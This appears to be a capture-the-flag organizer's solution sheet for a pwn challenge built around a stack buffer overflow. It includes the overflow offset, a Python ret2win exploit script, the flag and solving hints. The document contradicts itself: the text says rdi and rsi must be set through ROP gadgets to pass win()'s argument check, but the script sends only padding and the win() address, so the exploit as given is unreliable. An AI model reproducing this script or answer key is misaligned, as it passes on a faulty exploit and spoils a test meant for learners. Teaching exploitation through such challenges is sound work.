# PWN-03 — AURELIA GATEWAY: Organizer Solution Document

## Challenge Metadata
- **ID**: PWN-03
- **Title**: AURELIA GATEWAY
- **Category**: Pwn
- **Difficulty**: Hard
- **Points**: 300
- **Estimated solve time**: 35–50 minutes

## Vulnerability & Concept
- **Vulnerability**: Unbounded `fread(buffer, 1, 256, stdin)` into a 64-byte stack buffer.
- **Mitigations**: No Canary (`-fno-stack-protector`), No PIE (`-no-pie`).

## Exact Exploitation Path
1. Leaked `win()` address printed on banner.
2. Buffer size in `gateway_service` is 64 bytes. Offset to saved RIP is 72 bytes.
3. Overwrite return address to `win()`.
4. Pass arguments `rdi = 0xDEADBEEF` and `rsi = 0xCAFEBABE` via ROP gadgets or direct execution path.

## Python Exploit Script
```python
import subprocess, struct

win_addr = 0x4011d6
payload = b'A' * 72 + struct.pack('<Q', win_addr)

p = subprocess.Popen(['./aurelia_gateway'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
out, _ = p.communicate(input=payload)
print(out.decode())
```

## Recovered Evidence & Flag
- **Flag**: `flag{MultiStage_ROP_Gateway_Bypass}`

## Hints
1. Analyze gateway_service in GDB or Ghidra. Note the win() address leaked in output and the 256-byte fread call into a 64-byte buffer.
2. Locate ROP gadgets (or set RDI=0xDEADBEEF and RSI=0xCAFEBABE) to pass the argument check in win().
3. Send 72 bytes padding followed by the address of win() with valid parameter registers to bypass the gateway check.
